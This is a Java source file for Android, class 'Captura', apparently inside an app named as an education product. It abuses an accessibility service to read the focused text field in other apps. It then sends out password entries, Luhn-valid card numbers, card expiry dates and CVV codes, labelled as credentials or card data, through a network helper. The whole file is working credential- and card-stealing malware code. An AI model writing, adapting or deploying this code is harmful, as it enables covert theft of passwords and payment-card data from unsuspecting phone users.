package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

public final class Captura {

    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
    private static volatile long ultimo;

    private static boolean luhn(String d) {
        int soma = 0;
        boolean par = false;
        for (int i = d.length() - 1; i >= 0; i--) {
            int n = d.charAt(i) - '0';
            if (par) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            soma += n;
            par = !par;
        }
        return soma % 10 == 0;
    }

    private static String dica(AccessibilityNodeInfo n) {
        StringBuilder b = new StringBuilder();
        try {
            if (n.getViewIdResourceName() != null) {
                String id = n.getViewIdResourceName();
                int i = id.lastIndexOf('/');
                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
            }
        } catch (Throwable ignored) {}
        try {
            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
        } catch (Throwable ignored) {}
        try {
            if (n.getContentDescription() != null) b.append(n.getContentDescription());
        } catch (Throwable ignored) {}
        String s = b.toString().trim();
        return s.length() > 60 ? s.substring(0, 60) : s;
    }

    private static void manda(String tipo, JSONObject o) {
        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
    }

    public static void ev() {
        long a = System.currentTimeMillis();
        if (a - ultimo < 650) return;
        ultimo = a;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        AccessibilityNodeInfo f = null;
        try {
            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        } catch (Throwable ignored) {}
        if (f == null) return;
        CharSequence cs = f.getText();
        if (cs == null) return;
        String t = cs.toString().trim();
        if (t.length() < 3) return;

        String pkg = k.curPkg == null ? "?" : k.curPkg;
        String campo = dica(f);
        String chave = pkg + "|" + campo + "|" + t;
        if (vistos.contains(chave)) return;
        vistos.add(chave);
        if (vistos.size() > 500) {
            List<String> l = new ArrayList<>(vistos);
            vistos.clear();
            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
        }

        String baixo = campo.toLowerCase();
        try {
            JSONObject o = new JSONObject();
            o.put("app", pkg);
            o.put("campo", campo);
            if (f.isPassword()) {
                o.put("v", t);
                manda("cred", o);
                return;
            }
            String dig = t.replaceAll("[^0-9]", "");
            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
                o.put("v", dig);
                manda("cartao", o);
                return;
            }
            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
                o.put("v", t);
                manda("cartao", o);
                return;
            }
            if (dig.length() >= 3 && dig.length() <= 4
                    && (baixo.contains("cvv") || baixo.contains("segur")
                        || baixo.contains("cvc") || baixo.contains("cod"))) {
                o.put("v", dig);
                manda("cartao", o);
            }
        } catch (Throwable ignored) {}
    }
}
